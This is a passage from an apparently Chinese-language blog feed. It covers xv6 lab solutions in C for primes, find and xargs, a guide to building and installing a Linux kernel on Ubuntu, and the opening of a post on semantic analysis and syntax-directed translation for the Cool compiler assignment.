class="comment">//创建worker链</span></span><br><span class="line">    <span class="keyword">if</span>(fork() == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">        prepare_child_fds(pipefd);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//子进程继续执行worker工作即可</span></span><br><span class="line">        worker();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里是初始worker</span></span><br><span class="line">    <span class="comment">//即其自己指定输入，而非从父进程中读取输入</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prime 2\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//将所有可能的素数传递给子进程</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>; i &lt; <span class="number">35</span>; i += <span class="number">2</span>)</span><br><span class="line">        write(pipefd[<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(i));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//此时worker的工作基本做完</span></span><br><span class="line">    <span class="comment">//关闭管道符的写端，从而通知子进程已经没有数据</span></span><br><span class="line">    close(pipefd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//等待子进程退出即可</span></span><br><span class="line">    wait(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//结束进程即可</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="结果-2"><a href="#结果-2" class="headerlink" title="结果"></a>结果</h3><p>执行如下命令，完成实验测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make GRADEFLAGS=primes grade</span><br></pre></td></tr></table></figure><br><img src="primes实验结果.png" alt="primes实验结果"></p><h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><h3 id="要求-3"><a href="#要求-3" class="headerlink" title="要求"></a>要求</h3><blockquote><p>Write a simple version of the UNIX find program: find all the files in a directory tree with a specific name. Your solution should be in the file <strong>user/find.c</strong>.</p></blockquote><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>根据实验指南和xv6源代码<br>目录也是文件，并且目录内容是<strong>struct dirent</strong>数组</p><p>再直白一些，从目录文件描述符读取的字节，实际上就是<strong>struct dirent</strong>数组，其每一个元素就是一个目录项，包含有该目录项对应的名称</p><p>则基本逻辑就是递归的遍历目录项即可</p><h3 id="实现-3"><a href="#实现-3" class="headerlink" title="实现"></a>实现</h3><p>在Makefile中添加该用户态程序目标，如下所示<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">UPROGS=\</span><br><span class="line">$U/_cat\</span><br><span class="line">$U/_echo\</span><br><span class="line">$U/_find\</span><br><span class="line">$U/_forktest\</span><br><span class="line">$U/_grep\</span><br><span class="line">$U/_init\</span><br><span class="line">$U/_kill\</span><br><span class="line">$U/_ln\</span><br><span class="line">$U/_ls\</span><br><span class="line">$U/_mkdir\</span><br><span class="line">$U/_pingpong\</span><br><span class="line">$U/_primes\</span><br><span class="line">$U/_rm\</span><br><span class="line">$U/_sh\</span><br><span class="line">$U/_sleep\</span><br><span class="line">$U/_stressfs\</span><br><span class="line">$U/_usertests\</span><br><span class="line">$U/_grind\</span><br><span class="line">$U/_wc\</span><br><span class="line">$U/_zombie\</span><br></pre></td></tr></table></figure></p><p>再在<strong>user/</strong>目录下，创建<strong>find.c</strong>文件，仿照<strong>user/ls.c</strong>文件，添加相关的头文件，完成目录项的遍历。相关代码如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/fs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/fcntl.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 在path目录下，寻找名称为name的文件</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 即递归path的目录树，依次比较名称即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">find</span><span class="params">(<span class="type">char</span> *path, <span class="type">const</span> <span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">512</span>], *p;</span><br><span class="line">  <span class="type">int</span> fd;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> <span class="title">de</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((fd = open(path, O_RDONLY)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;find: cannot open %s\n&quot;</span>, path);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(fstat(fd, &amp;st) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;find: cannot stat %s\n&quot;</span>, path);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span>(st.type)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> T_DIR:</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strlen</span>(path) + <span class="number">1</span> + DIRSIZ + <span class="number">1</span> &gt; <span class="keyword">sizeof</span>(buf))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;find: path too long\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">strcpy</span>(buf, path);</span><br><span class="line">      p = buf+<span class="built_in">strlen</span>(buf);</span><br><span class="line">      *p++ = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span>(read(fd, &amp;de, <span class="keyword">sizeof</span>(de)) == <span class="keyword">sizeof</span>(de))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(de.inum == <span class="number">0</span>)</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 对于.和..文件，无需进行递归遍历</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(de.name, <span class="string">&quot;.&quot;</span>) || !<span class="built_in">strcmp</span>(de.name, <span class="string">&quot;..&quot;</span>))</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果文件名称为目标字符串，则输出即可</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(de.name, name))</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%s/%s\n&quot;</span>, path, de.name);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">strcpy</span>(p, de.name);</span><br><span class="line">        find(buf, name);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(argc &lt;= <span class="number">2</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;usage: find path name\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  find(argv[<span class="number">1</span>], argv[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="结果-3"><a href="#结果-3" class="headerlink" title="结果"></a>结果</h3><p>执行如下命令，完成实验测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make GRADEFLAGS=find grade</span><br></pre></td></tr></table></figure><br><img src="find实验结果.png" alt="find实验结果"></p><h2 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h2><h3 id="要求-4"><a href="#要求-4" class="headerlink" title="要求"></a>要求</h3><blockquote><p>Write a simple version of the UNIX xargs program: read lines from the standard input and run a command for each line, supplying the line as arguments to the command. Your solution should be in the file <strong>user/xargs.c</strong>.</p></blockquote><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>注意看清实验要求<br>xargs将管道输入的每一行当作要执行命令的额外参数<br>思路很简单，即在栈上申请一个<strong>args</strong>数组，并将<strong>xargs</strong>的参数复制到新数组中，并在最后添加从管道中解析出的参数即可</p><h3 id="实现-4"><a href="#实现-4" class="headerlink" title="实现"></a>实现</h3><p>在Makefile中添加该用户态程序目标，如下所示<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">UPROGS=\</span><br><span class="line">$U/_cat\</span><br><span class="line">$U/_echo\</span><br><span class="line">$U/_find\</span><br><span class="line">$U/_forktest\</span><br><span class="line">$U/_grep\</span><br><span class="line">$U/_init\</span><br><span class="line">$U/_kill\</span><br><span class="line">$U/_ln\</span><br><span class="line">$U/_ls\</span><br><span class="line">$U/_mkdir\</span><br><span class="line">$U/_pingpong\</span><br><span class="line">$U/_primes\</span><br><span class="line">$U/_rm\</span><br><span class="line">$U/_sh\</span><br><span class="line">$U/_sleep\</span><br><span class="line">$U/_stressfs\</span><br><span class="line">$U/_usertests\</span><br><span class="line">$U/_grind\</span><br><span class="line">$U/_wc\</span><br><span class="line">$U/_xargs\</span><br><span class="line">$U/_zombie\</span><br></pre></td></tr></table></figure></p><p>再在<strong>user/</strong>目录下，创建<strong>xargs.c</strong>文件，仿照<strong>user/ls.c</strong>文件，添加相关的头文件，并完成参数数组的设置即可。相关的代码如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXLINE     256</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 默认每一行不超过256个字节</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buf[MAXLINE];</span><br><span class="line">  <span class="type">char</span> *args[argc + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">//设置参数列表</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; argc; ++i)</span><br><span class="line">    args[i - <span class="number">1</span>] = argv[i];</span><br><span class="line"></span><br><span class="line">  args[argc - <span class="number">1</span>] = buf;</span><br><span class="line">  args[argc] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">//从标准输入中读取参数</span></span><br><span class="line">  <span class="type">int</span> ch = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>(read(<span class="number">0</span>, &amp;ch, <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ch == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 一行解析结束，fork-exec执行</span></span><br><span class="line">      args[argc - <span class="number">1</span>][idx] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(fork() == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//在子进程中</span></span><br><span class="line">        exec(args[<span class="number">0</span>], args);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;xargs: cannot exec %s\n&quot;</span>, args[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//等待子进程结束</span></span><br><span class="line">      wait(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//重新解析行</span></span><br><span class="line">      idx = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">      args[argc - <span class="number">1</span>][idx++] = ch;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">//终止当前进程</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="结果-4"><a href="#结果-4" class="headerlink" title="结果"></a>结果</h3><p>执行如下命令，完成实验测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make GRADEFLAGS=xargs grade</span><br></pre></td></tr></table></figure><br><img src="xargs实验结果.png" alt="xargs实验结果"></p>]]></content>
      
      
      <categories>
          
          <category> 手写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内核 </tag>
            
            <tag> 手写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux内核编译</title>
      <link href="/2022/05/15/linux%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91/"/>
      <url>/2022/05/15/linux%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这篇博客分析一下Ubuntu更换内核的步骤</p><h1 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h1><p>执行如下命令，安装编译内核所需要的依赖组件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc flex libelf-dev bison</span><br></pre></td></tr></table></figure></p><h1 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h1><p>执行如下类似命令，从相关的网站中下载版本的内核源码并解压<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/linux-5.17.tar.gz &amp;&amp; tar -zxvf linux-5.17.tar.gz</span><br></pre></td></tr></table></figure></p><h1 id="编译设置"><a href="#编译设置" class="headerlink" title="编译设置"></a>编译设置</h1><p>为了使编译的内核可以在当前Ubuntu系统中完美适配，在需要以当前的内核设置，来编译新内核<br>执行如下命令即可以设置相同的选项<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /boot/config-$(<span class="built_in">uname</span> -r) .config &amp;&amp; make oldconfig</span><br></pre></td></tr></table></figure></p><p>执行过程中，由于存在<strong>新特性</strong>或<strong>新设定</strong>，程序会对此进行询问，默认使用回车选择推荐配置即可</p><h1 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h1><p>完成设置后，执行如下命令进行编译即可<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j $(<span class="built_in">nproc</span>) all</span><br></pre></td></tr></table></figure></p><h1 id="安装内核"><a href="#安装内核" class="headerlink" title="安装内核"></a>安装内核</h1><h2 id="模块安装"><a href="#模块安装" class="headerlink" title="模块安装"></a>模块安装</h2><p>执行如下命令，将内核模块安装到指定目录中<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su -c <span class="string">&#x27;make -j $(nproc) INSTALL_MOD_STRIP=1 modules_install&#x27;</span></span><br></pre></td></tr></table></figure></p><p>其中，<strong>INSTALL_MOD_STRIP</strong>选项用来去除调试信息，避免生成的镜像过大而无法正常启动</p><h2 id="镜像安装"><a href="#镜像安装" class="headerlink" title="镜像安装"></a>镜像安装</h2><p>执行如下命令，安装内核镜像<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su -c <span class="string">&#x27;make -j $(nproc) install&#x27;</span></span><br></pre></td></tr></table></figure></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote><ol><li><a href="https://trainingportal.linuxfoundation.org/learn/course/a-beginners-guide-to-linux-kernel-development-lfd103/building-and-installing-your-first-kernel/building-and-installing-your-first-kernel?page=1">https://trainingportal.linuxfoundation.org/learn/course/a-beginners-guide-to-linux-kernel-development-lfd103/building-and-installing-your-first-kernel/building-and-installing-your-first-kernel?page=1</a></li><li><a href="https://linuxhint.com/compile-and-install-kernel-ubuntu/">https://linuxhint.com/compile-and-install-kernel-ubuntu/</a></li><li><a href="https://groups.google.com/g/comp.os.linux.development.system/c/bjU7AfeZl5I">https://groups.google.com/g/comp.os.linux.development.system/c/bjU7AfeZl5I</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译原理-设计与实现-三</title>
      <link href="/2022/02/07/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0-%E4%B8%89/"/>
      <url>/2022/02/07/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0-%E4%B8%89/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  <strong>语义分析</strong>略难…。<br>  这里简单记录一下<strong>语义分析</strong>相关的知识，并且完成<strong>Programming Assignment V</strong></p><h1 id="Semantic-Analysis"><a href="#Semantic-Analysis" class="headerlink" title="Semantic Analysis"></a>Semantic Analysis</h1><p>  语义分析是编译器的第三个阶段。语义分析器从语法分析器处获得一棵<strong>AST</strong>，并检查该<strong>AST</strong>的上下文相关的属性</p><h2 id="属性文法"><a href="#属性文法" class="headerlink" title="属性文法"></a>属性文法</h2><p>  为了确定<strong>AST</strong>中诸如变量节点类型等问题，则自然的，需要指定该节点的<strong>数据类型属性</strong>，则必须给节点配备一系列属性。</p><p>  然后，再利用节点的相关属性，从而在<strong>AST</strong>上进行一系列的语义动作(诸如类型检查等)</p><h3 id="Syntax-Directed-Definition"><a href="#Syntax-Directed-Definition" class="headerlink" title="Syntax-Directed Definition"></a>Syntax-Directed Definition</h3><p>  语法制导定义<strong>(SDD)</strong>，即为每个文法符号引入一组属性，并且每个文法的产生式都配备一组与之关联的语义计算规则</p><p>  而这些属性可以简单分为两类</p><ul><li><p>综合属性(synthesized attribute):<br>即产生式<strong>头</strong>的符号属性由产生式<strong>体</strong>的属性定义<br><img src="综合属性.png" alt="综合属性"></p></li><li><p>继承属性(inherited attribute):<br>即产生式<strong>体</strong>的符号属性由产生式<strong>头</strong>和该符号左侧的产生式<strong>体</strong>的属性定义<br><img src="继承属性.png" alt="继承属性"></p><p>基于此，可简单将<strong>SDD</strong>分为两类</p></li><li>S属性<br>如果一个<strong>SDD</strong>的每个属性都是综合属性</li><li><p>L属性<br>对于<strong>SDD</strong>的每个属性</p><ul><li>要么是综合属性</li><li>要么是继承属性，但满足如下限值：<br>对于产生式<script type="math/tex">A \rightarrow X_{1}X_{2} \cdots X_{n}</script>及其对应的规则定义的继承属性<script type="math/tex">X_{i}.a</script><ol><li><script type="math/tex">X_{i}.a</script>是和产生式<strong>头</strong><script type="math/tex">A</script>关联的继承属性</li><li><script type="math/tex">X_{i}.a</script>是位于<script type="math/tex">X_{i}</script>左边的文法符号<script type="math/tex">X_{1}、X_{2}、\cdots 、X_{i-1}</script>相关的继承属性或综合属性</li><li><script type="math/tex">X_{i}.a</script>是和<script type="math/tex">X_{i}</script>本身相关的继承属性或综合属性</li></ol></li></ul><p>之所以这样分类，是为了之后进行<strong>语义分析</strong>时，只需要尽可能少的遍历<strong>AST</strong>即可完成——因为S属性和L属性的传导是<strong>单向</strong>的</p></li></ul><h3 id="Syntax-Directed-Translation-Scheme"><a href="#Syntax-Directed-Translation-Scheme" class="headerlink" title="Syntax-Directed Translation Scheme"></a>Syntax-Directed Translation Scheme</h3><p>  如果我们构建相关的属性文法，并对于每个语法的产生式，都额外的嵌入相关的语义动作。</p><p>  对于传入的<strong>AST</strong>，按照<strong>前序遍历</strong>的方式遍历该<strong>AST</strong>——当产生式体中的一个动作在其左边的所有文法符号都匹配之后立刻执行。这样，就相当于完成了<strong>语义分析</strong></p><p>  基于前面的属性文法，语法制导的翻译方案大体可分为两类——<strong>自底向上的S属性的SDD</strong>、<strong>自顶向下L属性的SDD</strong></p><h4 id="自底向上的S属性的SDD语义分析-一般配合LR语法分析"><a href="#自底向上的S属性的SDD语义分析-一般配合LR语法分析" class="headerlink" title="自底向上的S属性的SDD语义分析(一般配合LR语法分析)"></a>自底向上的S属性的SDD语义分析(一般配合LR语法分析)</h4><p>  对于该情况，使用如下方式构造<strong>SDT</strong>——将每个<strong>语义动作</strong>都放在产生式的最后面</p><p>  这样子，就完成了该情况下的<strong>语义分析</strong></p><p>  <img src="自底向上-SDT.png" alt="自底向上-SDT"><br>  <img src="自底向上-3-5-4.png" alt="自底向上-3 * 5 + 4"></p><h4 id="自顶向下的L属性的SDD语义分析-一般配合LL语法分析"><a href="#自顶向下的L属性的SDD语义分析-一般配合LL语法分析" class="headerlink" title="自顶向下的L属性的SDD语义分析(一般配合LL语法分析)"></a>自顶向下的L属性的SDD语义分析(一般配合LL语法分析)</h4><p>  对于该情况，使用如下方式构造<strong>SDT</strong></p><ol><li>将计算某个<strong>非终结符号</strong><script type="math/tex">A</script>的继承属性的动作插入到产生式<strong>体</strong>中紧靠在<script type="math/tex">A</script>的本次出现之前的位置上</li><li><p>将计算一个产生式<strong>头</strong>的综合属性的动作放置在这个产生式<strong>体</strong>的最右端</p><p>这样子，就完成了该情况下的<strong>语义分析</strong></p><p><img src="自顶向下-SDT.png" alt="自顶向下-SDT"><br><img src="自顶向下-3-5-4.png" alt="自顶向下-3 * 5 + 4"></p></li></ol><h1 id="PA4-Semantic-Analysis"><a href="#PA4-Semantic-Analysis" class="headerlink" title="PA4 Semantic Analysis"></a>PA4 Semantic Analysis</h1><h2 id="实验描述"><a href="#实验描述" class="headerlink" title="实验描述"></a>实验描述</h2><p>  在该实验中，需要完成<strong>Cool</strong>的语义分析器，从而完成输入的<strong>AST</strong>的语法检查，并返回一个注释语法分析树<strong>annotated AST</strong></p><p>  需要注意的是，实现的语义分析器应该具有足够的鲁棒性——可以在任何输入下都正常工作，即可以处理错误</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>  该实验中依赖<strong>2.4</strong>版本的<strong>Bison</strong>，和之前的<strong>Flex</strong>，则在<code>assignments/PA4</code>目录执行如下命令设置环境<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get update \</span><br><span class="line">  &amp;&amp; <span class="built_in">sudo</span> apt-get install -y m4 \</span><br><span class="line">  &amp;&amp; (<span class="built_in">cd</span> ../../bin/flex; ./configure; make; <span class="built_in">sudo</span> make install) \</span><br><span class="line">  &amp;&amp; (<span class="built_in">cd</span> ../../bin/bison; ./configure; make; <span class="built_in">sudo</span> make install)</span><br></pre></td></tr></table></figure></p><h2 id="实验实现"><a href="#实验实现" class="headerlink" title="实验实现"></a>实验实现</h2><p>  下面是个人的思路及其<a href="https://gitee.com/jiaweihawk/stanford-compiler/tree/d07a678711e0a3f1f67001e2c5d0c74a74c383ce/">实现</a></p><p>  这次实验着实给我留下了非常深刻的影响——<strong>一开始</strong>看不懂框架逻辑；<strong>实现一部分</strong>发现模块设计不合理；<strong>最终测试</strong>时面向测试样例编程<br>  